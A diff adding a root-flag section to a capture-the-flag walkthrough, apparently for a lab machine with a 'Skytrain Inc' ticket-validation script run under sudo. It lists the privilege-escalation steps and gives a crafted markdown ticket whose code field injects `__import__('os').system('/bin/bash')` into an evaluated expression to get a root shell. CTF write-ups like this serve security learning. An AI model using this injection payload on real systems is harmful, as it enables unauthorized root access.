@@ -19,6 +19,31 @@ User FLAG
 
 If you want you can also use the `exploit.sh` and play around.
 
+Root FLAG
+-----
+
+1. Do a simple `sudo -l` and found a file under /opt/skytrain_inc
+2. Analyze the file and found that it is a python script
+3. Create a crafted .md file under `/tmp` and execute the script with `sudo`
+4. Crafted md should contain 
+
+5. Start with `# Skytrain Inc`
+6. `## Ticket to <Location>`
+7. `__Ticket Code:__`
+8. `**`
+9. Until the first `+` must be an int that when divided by 7 has a remainder of 4
+
+```md
+# Skytrain Inc
+## Ticket to New York
+
+__Ticket Code:__
+**32+100+43+ __import__('os').system('/bin/bash')**
+```
+
+10. Obtain root access
+11. Found the root flag
+
 ## Versions
 
 Apache 2.4.41
